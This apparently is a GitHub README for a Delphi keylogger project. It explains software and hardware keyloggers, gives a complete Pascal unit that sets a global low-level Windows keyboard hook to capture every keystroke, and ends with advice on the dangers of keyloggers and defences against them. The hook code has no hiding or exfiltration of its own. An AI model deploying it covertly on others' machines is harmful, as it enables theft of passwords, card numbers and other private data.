# Keylogger:

</br>

![Compiler](https://github.com/user-attachments/assets/a916143d-3f1b-4e1f-b1e0-1067ef9e0401) ![10 Seattle](https://github.com/user-attachments/assets/c70b7f21-688a-4239-87c9-9a03a8ff25ab) ![10 1 Berlin](https://github.com/user-attachments/assets/bdcd48fc-9f09-4830-b82e-d38c20492362) ![10 2 Tokyo](https://github.com/user-attachments/assets/5bdb9f86-7f44-4f7e-aed2-dd08de170bd5) ![10 3 Rio](https://github.com/user-attachments/assets/e7d09817-54b6-4d71-a373-22ee179cd49c)  ![10 4 Sydney](https://github.com/user-attachments/assets/e75342ca-1e24-4a7e-8fe3-ce22f307d881) ![11 Alexandria](https://github.com/user-attachments/assets/64f150d0-286a-4edd-acab-9f77f92d68ad) ![12 Athens](https://github.com/user-attachments/assets/59700807-6abf-4e6d-9439-5dc70fc0ceca)  
![Components](https://github.com/user-attachments/assets/d6a7a7a4-f10e-4df1-9c4f-b4a1a8db7f0e) ![None](https://github.com/user-attachments/assets/30ebe930-c928-4aaf-a8e1-5f68ec1ff349)  
![Description](https://github.com/user-attachments/assets/dbf330e0-633c-4b31-a0ef-b1edb9ed5aa7) ![Keylogger](https://github.com/user-attachments/assets/b9f6df71-b0e6-4106-a6cc-e02717566d90)  
![Last Update](https://github.com/user-attachments/assets/e1d05f21-2a01-4ecf-94f3-b7bdff4d44dd) ![012026](https://github.com/user-attachments/assets/ae91e595-2dbf-4d94-b953-81e4fd25dcc3)   
![License](https://github.com/user-attachments/assets/ff71a38b-8813-4a79-8774-09a2f3893b48) ![Freeware](https://github.com/user-attachments/assets/1fea2bbf-b296-4152-badd-e1cdae115c43)  

</br>

A keylogger is a piece of software or hardware designed to record and read all keystrokes on a computer keyboard. Software keyloggers are preferred because they can be easily installed on devices and no physical access is required. Keyloggers fall into the category of spyware.

</br>

### Important:
```
Older Delphi versions may experience compiler problems; in these cases, the type name
"PWideChar" must be rewritten to "PAnsiChar".
```

</br>

Software keylogger: This software inserts itself between the operating system and the keyboard to read the input and then forward it to the operating system. The recorded data is then sent to another computer over the internet or saved on the hard drive of the monitored computer.

</br>

![Keylogger](https://github.com/user-attachments/assets/1e387e23-c8be-4c47-8373-9675041c2f66)

</br>

Hardware keyloggers: Hardware keyloggers require direct physical access to the affected computer to be used. Hardware keyloggers are primarily used when it is not possible or practical to install a software keylogger on the affected device. They are inserted directly between the keyboard and the computer. Hardware keyloggers, which store the captured information in integrated memory, such as RAM, are subsequently removed. Other hardware keyloggers can send the logged data over networks or wirelessly.

</br>

![Keylogger-Process-in-User-Activity](https://github.com/user-attachments/assets/dd2a17e9-e2c8-4e0f-9bcf-698f8df36f0b)

</br>

Keylogger data can represent a valuable IT forensic source that can be used by IT forensic experts to investigate security incidents. The use of keyloggers in corporate environments is not completely prohibited, but a detailed legal review is recommended before use.

# HookUnit
```pascal
unit HookUnit;

interface

{$SCOPEDENUMS ON}

uses
  Windows, Messages, SysUtils;

type
  TGlobalKeyboardHook = class
  public
    type
      TKBDLLHookStruct = packed record
        vkCode: DWORD;
        scanCode: DWORD;
        flags: DWORD;
        time: DWORD;
        dwExtraInfo: ULONG_PTR;
      end;
      PKBDLLHookStruct = ^TKBDLLHookStruct;

      TKeyAction = (KeyDown, KeyUp, SysKeyDown, SysKeyUp);
  private
    class var
      FInstance: TGlobalKeyboardHook;
    type
      TOnKeyEvent = procedure(const AKeyAction: TGlobalKeyboardHook.TKeyAction; const AKeyCode: DWORD;
        const AWasInjected: Boolean; const AKey: Char) of object;
    const
      LLKHF_EXTENDED = $00000001;
      LLKHF_INJECTED = $00001000;
      LLKHF_ALTDOWN = $00010000;
      LLKHF_UP = $01000000;
    var
      FActive: Boolean;
      FHook: THandle;
      FOnKeyEvent: TOnKeyEvent;
      FShiftKeyPressed: Boolean;
    class function GetInstance: TGlobalKeyboardHook; static;
    function HookKeyboard: Boolean;
    function UnhookKeyboard: Boolean;
    procedure SetActive(const Value: Boolean);
    procedure SetOnKeyEvent(const Value: TOnKeyEvent);
    procedure DoKeyboardEvent(const nCode, AMessage: LongInt; const AData: TGlobalKeyboardHook.PKBDLLHookStruct);
  public
    destructor Destroy;
    class destructor Destroy;
    class property Instance: TGlobalKeyboardHook read GetInstance;
    property Active: Boolean read FActive write SetActive;
    property OnKeyEvent: TOnKeyEvent read FOnKeyEvent write SetOnKeyEvent;
  end;

implementation

function KeyboardHookProc(const nCode, AMessage: LongInt; const AData: TGlobalKeyboardHook.PKBDLLHookStruct): Integer; stdcall;
begin
  Result := CallNextHookEx(TGlobalKeyboardHook.Instance.FHook, nCode, AMessage, NativeInt(AData));
  if nCode = HC_ACTION then
    TGlobalKeyboardHook.Instance.DoKeyboardEvent(nCode, AMessage, AData);
end;

{ TGlobalKeyboardHook }

class destructor TGlobalKeyboardHook.Destroy;
begin
  if Assigned(FInstance) then
    FreeAndNil(FInstance);
end;

procedure TGlobalKeyboardHook.DoKeyboardEvent(const nCode, AMessage: Integer; const AData: TGlobalKeyboardHook.PKBDLLHookStruct);
var
  CurrentChar: Char;
  KeyAction: TGlobalKeyboardHook.TKeyAction;
  KeyboardState: TKeyboardState;
begin
  if Assigned(FOnKeyEvent) then
  begin
    case AMessage of
      WM_KEYDOWN:
        begin
          KeyAction := TGlobalKeyboardHook.TKeyAction.KeyDown;
          if AData.vkCode in [VK_SHIFT, VK_LSHIFT, VK_RSHIFT] then
            FShiftKeyPressed := True;
        end;
      WM_KEYUP:
        begin
          KeyAction := TGlobalKeyboardHook.TKeyAction.KeyUp;
          if AData.vkCode in [VK_SHIFT, VK_LSHIFT, VK_RSHIFT] then
            FShiftKeyPressed := False;
        end;
      WM_SYSKEYDOWN:
        KeyAction := TGlobalKeyboardHook.TKeyAction.SysKeyDown;
      WM_SYSKEYUP:
        KeyAction := TGlobalKeyboardHook.TKeyAction.SysKeyUp;
    end;

    if AData.vkCode >= VK_SPACE then
    begin
      CurrentChar := Char(MapVirtualKey(AData.vkCode, MAPVK_VK_TO_CHAR));
      if FShiftKeyPressed then
        CurrentChar := CharUpper(@CurrentChar)^
      else
        CurrentChar := CharLower(@CurrentChar)^;
    end
    else
      CurrentChar := #0;

    FOnKeyEvent(KeyAction, AData.vkCode, LLKHF_INJECTED and AData.flags > 0, CurrentChar);
  end;
end;

destructor TGlobalKeyboardHook.Destroy;
begin
  Active := False;
end;

class function TGlobalKeyboardHook.GetInstance: TGlobalKeyboardHook;
begin
  if not Assigned(FInstance) then
    FInstance := TGlobalKeyboardHook.Create;
  Result := FInstance;
end;

procedure TGlobalKeyboardHook.SetActive(const Value: Boolean);
begin
  if FActive <> Value then
  begin
    if Value then
      HookKeyboard
    else
      UnhookKeyboard;
    FActive := Value;
  end;
end;

procedure TGlobalKeyboardHook.SetOnKeyEvent(const Value: TOnKeyEvent);
begin
  FOnKeyEvent := Value;
end;

function TGlobalKeyboardHook.HookKeyboard: Boolean;
begin
  if FHook = 0 then
  begin
    FHook := SetWindowsHookEx(WH_KEYBOARD_LL, @KeyboardHookProc, HInstance, 0);
    Result := FHook <> 0;
  end
  else
    Result := True;
end;

function TGlobalKeyboardHook.UnhookKeyboard: Boolean;
begin
  if FHook <> 0 then
  begin
    Result := UnhookWindowsHookEx(FHook);
    FHook := 0;
  end
  else
    Result := True;
end;

end.
```

</br>

# Dangers of Keyloggers
Dangers of malicious Keyloggers are that they trap information before it can be encrypted. For example, banking websites (should) provide a secure connection between your computer and the website so that all data is encrypted in transit. However, as you type your credentials in, the Keylogger is recording those keystrokes, bypassing security measures. Keyloggers not only have the ability to trap login credentials, but credit card numbers, bank account numbers, private passwords for encrypted files, financial records, email and other PII.

# Protecting Yourself from Keyloggers
* Install top-notch anti-pestware software on your system, preferably programs that help to prevent Keyloggers and watch for Keylogging activities. Though this won't guarantee you will not get a Keylogger, it can help by recognizing and removing known Keylogger signatures.
* Regularly check the processes running on your system looking for anything that doesn’t belong. In Windows® systems you can use Task Manager to view running processes. Third party applications are also available that will not only show you which processes are running, but will provide a direct link to information online regarding the nature of the process.
* A firewall commonly does not provide Keylogger protection, but can alert you if a program is trying to send information out to the Internet. By stopping this action you can prevent a thief from retrieving a log, and be alerted to the possible presence of a Keylogger.
* Other methods to ‘confuse’ a Keylogger include typing extra letters or numbers when entering secure information, then highlighting the characters that do not belong and entering a legitimate character to replace them. You can also use a browser with a form-filler function that will keep usernames and passwords securely on your system, and fill them in automatically when you enter a site, without forcing you to use the mouse or keyboard. There are also programs that scan for Keyloggers, but they can detect legitimate processes as well, making it difficult for the average person to make real use of these tools.
